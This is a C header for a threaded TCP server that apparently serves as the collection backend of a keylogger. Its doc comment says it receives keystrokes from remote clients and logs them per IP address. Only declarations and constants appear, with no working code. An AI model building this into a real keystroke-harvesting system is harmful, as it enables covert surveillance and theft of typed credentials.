// server.h
#ifndef SERVER_H
#define SERVER_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <pthread.h>

/**
 * @def SERVER_PORT
 * @brief Port number for the server to listen on.
 */
#define SERVER_PORT "8080" 

/**
 * @def BACKLOG
 * @brief Maximum number of pending connections.
 */
#define BACKLOG 10 

/**
 * @def BUFFER_SIZE
 * @brief Size of the buffer for receiving data.
 */
#define BUFFER_SIZE 1024 

/**
 * @def LOG_DIR
 * @brief Directory to store client logs.
 */
#define LOG_DIR "client_logs" 

/**
 * @def SUCCESS
 * @brief Success status code.
 */
#define SUCCESS 0 

/**
 * @def ERR_THREAD_CREATION
 * @brief Error status code for thread creation failure.
 */
#define ERR_THREAD_CREATION 1 

/**
 * @struct ClientData
 * @brief Structure to hold data for a connected client.
 * @var ClientData::socket_fd 
 * Socket file descriptor for the client connection.
 * @var ClientData::ip_address 
 * Client's IP address.
 */
typedef struct {
    int socket_fd;
    char ip_address[INET6_ADDRSTRLEN]; 
} ClientData;

/**
 * @brief Thread worker function to handle incoming keystrokes from a single client.
 * @details Creates a unique log file based on the client's IP address. Continuously reads
 * data from the client's socket and appends it to the log file in real-time.
 * @param arg Pointer to a ClientData structure containing the socket FD and IP address.
 * @return void* Returns NULL upon thread termination.
 */
void *handle_client(void *arg);

#endif